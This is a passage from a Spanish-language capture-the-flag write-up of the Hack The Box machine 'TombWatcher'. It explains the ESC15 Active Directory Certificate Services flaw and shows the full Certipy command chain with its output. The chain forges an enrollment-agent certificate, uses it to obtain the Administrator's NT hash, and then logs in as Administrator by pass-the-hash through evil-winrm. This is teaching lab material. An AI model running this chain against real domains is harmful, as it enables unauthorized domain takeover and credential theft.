        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
~~~

### Understanding Vulnerability

Esta técnica explota un fallo en la lógica de validación de la CA (`Certificate Authority`) cuando procesa solicitudes para plantillas con `Schema Version 1`, lo que permite manipular `EKU` (`Extended Key Usage`).

> Cuando la CA procesa una solicitud para una plantilla `Schema Version 1`, a menudo copia las `EKU` definidas en la plantilla tanto en la extensión `EKU` como en la extensión `Application Policies` del certificado emitido. 
{: .notice--info}

Combinado con la capacidad de inscribir usuarios y la flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` en `True`, un atacante podría incluir un SAN (`Subject Alternative Name`) en la solicitud del certificado, y así podría o bien escalar privilegios o moverse lateralmente por un dominio utilizando el certificado a modo de autenticación

- Escenario `A`: Un atacante podría emitir un certificado inyectando `Client Authentication` (OID `1.3.6.1.5.5.7.3.2`) para habilitar el inicio de sesión con el certificado.
- Escenario `B`: `Certificate Request Agent` OID (`1.3.6.1.4.1.311.20.2.1`) para permitir que un certificado actúe como un Agente de Inscripción (ataque similar a `ESC3`).

La plantilla vulnerable cumple con los requerimientos necesarios para emitir un certificado en nombre de otros usuarios

~~~ bash
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
	...
	...
	...
    Schema Version                      : 1
    ...
    ...
    ...
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
~~~

### Issues

> Si enumeramos sin la flag `-vulnerable`, notaremos que en la plantilla se ve el SID asignado. Es posible que no restablezcamos la cuenta `cert_admin` que cumple con esto, por lo que debemos eliminar el usuario y volver a reestablecerlo. 
{: .notice--danger}

~~~ powershell
# Eliminar el usuario restablecido que no cumple
Remove-ADUser -Identity "cert_admin" -Confirm:$false

# Volvemos a reestablecer el objeto correcto
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
~~~

### Exploiting

Podremos utilizar el escenario  `B`, que implica obtener un certificado de "Agente", convirtiendo a la cuenta `cert_admin` en un agente de inscripción, seguido de un certificado para un usuario con privilegios, como `Administrator`.

Comenzaremos solicitando un certificado para el usuario `Administrator` utilizando la plantilla `WebServer` e inyectando una extensión `Application Policies` que contiene el OID de `Certificate Request Agent`

~~~ bash
certipy req -u 'cert_admin@tombwatcher.htb' -hashes :dceb50ac4ab6609ebcefa230760477db -dc-ip 10.10.11.72 -target DC01.tombwatcher.htb -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'Administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Certificate Request Agent'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
~~~

Utilizaremos el certificado generado para solicitar un nuevo certificado en nombre del usuario `Administrator`. Esto es posible debido a la extensión `Application Policies` con el valor de `Certificate Request Agent`

~~~ bash
certipy req -u 'cert_admin@tombwatcher.htb' -hashes :dceb50ac4ab6609ebcefa230760477db -dc-ip 10.10.11.72 -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'User' -pfx administrator.pfx -on-behalf-of 'tombwatcher\Administrator'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
~~~

Sincronizaremos nuestro reloj con el DC (necesario para una autenticación `kerberos`) y utilizaremos el certificado generado para autenticarnos en el dominio. La CA tomará el SAN, que apunta al usuario `Administrator`, y obtendremos sus credenciales

~~~ bash
ntpdate 10.10.11.72 && certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72  
                          
2025-10-11 16:54:45.277328 (-0400) +0.198750 +/- 0.193355 10.10.11.72 s1 no-leap      
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61...           
~~~


## Root Time

Ya que tenemos tanto credenciales en caché como el hash NTLM del usuario `Administrator`, simplemente podremos conectarnos vía `WinRM` haciendo `PassTheHash`

~~~ powershell
evil-winrm-py -i DC01.tombwatcher.htb -u 'Administrator' -H 'f61...'
 
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to DC01.tombwatcher.htb:5985 as Administrator
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
tombwatcher\administrator
~~~

Ya podremos ver la última flag ubicada en el escritorio del usuario `Administrator`

~~~ powershell
evil-winrm-py PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
788...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> Man cannot discover new oceans unless he has the courage to lose sight of the shore.
> — André Gide
{: .notice--info}
